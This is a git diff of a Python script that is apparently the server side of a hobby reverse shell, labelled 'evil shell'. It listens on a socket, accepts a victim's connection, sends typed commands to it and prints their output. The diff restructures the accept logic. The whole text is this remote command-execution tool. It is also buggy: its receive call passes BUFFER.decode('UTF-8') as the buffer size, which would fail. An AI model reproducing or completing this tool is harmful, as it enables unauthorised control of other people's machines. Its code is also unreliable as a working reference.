@@ -22,27 +22,29 @@ def main():
     sock.bind((HOST, PORT))
     sock.listen(5) # number of client connections we can accept
 
-
+    print("We are here")
    # connect, address = sock.accept()
 
-    with sock.accept() as (connect, address):
-        print(f"Connected by {address}")
-        while True:
-            # data = connect.recv(BUFFER).decode("UTF-8")
-            command = input("$ evil shell :3 > ")
-            if command == "":
-                # connect.send("command".encode())
-                break
-            print("**********sending command!!! please wait :3")
-            connect.send(command.encode())
-            output = connect.recv(BUFFER.decode("UTF-8"))
-            print("**********print results: ")
-            print(output)
-            
-            # if len(data) > 0:
-            #     print("Received data: " + data)
+    connect, address = sock.accept()
+    
+    # output = connect.recv(BUFFER.decode("UTF-8"))
+    print(f"Connected by {address}")
+    while True:
+        # data = connect.recv(BUFFER).decode("UTF-8")
+        command = input("$ evil shell :3 > ")
+        if command == "":
+            # connect.send("command".encode())
+            break
+        print("**********sending command!!! please wait :3")
+        connect.send(command.encode())
+        output = connect.recv(BUFFER.decode("UTF-8"))
+        print("**********print results: ")
+        print(output)
+        
+        # if len(data) > 0:
+        #     print("Received data: " + data)
 
-            
+        
     print("closing connection")
     connect.close()
 
